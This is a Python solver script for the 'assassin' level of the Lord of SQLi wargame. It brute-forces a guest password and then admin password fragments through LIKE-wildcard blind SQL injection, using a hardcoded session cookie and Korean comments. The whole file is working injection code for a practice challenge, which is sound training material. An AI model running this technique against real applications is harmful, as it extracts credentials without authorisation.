import requests
import string

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
params = {'pw' : None}
cookies = {'PHPSESSID' :'nui79padnqo9dshj9fl9m5ani3'}

# Guest의 비밀번호가  admin의 비밀번호 포함하네;  
answer = ''
printable = string.printable.replace("%","")
printable = printable.replace("_","")
while True:
    for i in printable:
        payload = '%{}%'.format(answer + i)
        params['pw'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello guest" in response.text):
            answer += i
            print(payload)
            break
    if (i == printable[-1]):
        break

while True:
    for i in printable:
        payload = '%{}%'.format(i + answer)
        params['pw'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello guest" in response.text):
            answer = i + answer
            print(payload)
            break
    if(i == printable[-1]):
        break

# guest 비밀번호 : 90d2fe10

possible = '0129dfe'

# 가정 1. admin이 0을 가지고 있다.
for i in possible:
    for j in possible:
        payload = '%{}%'.format(i + j)
        params['pw'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            print(payload)
            break

    for j in possible:
        payload = '%{}%'.format(j + i)
        params['pw'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            print(payload)
            break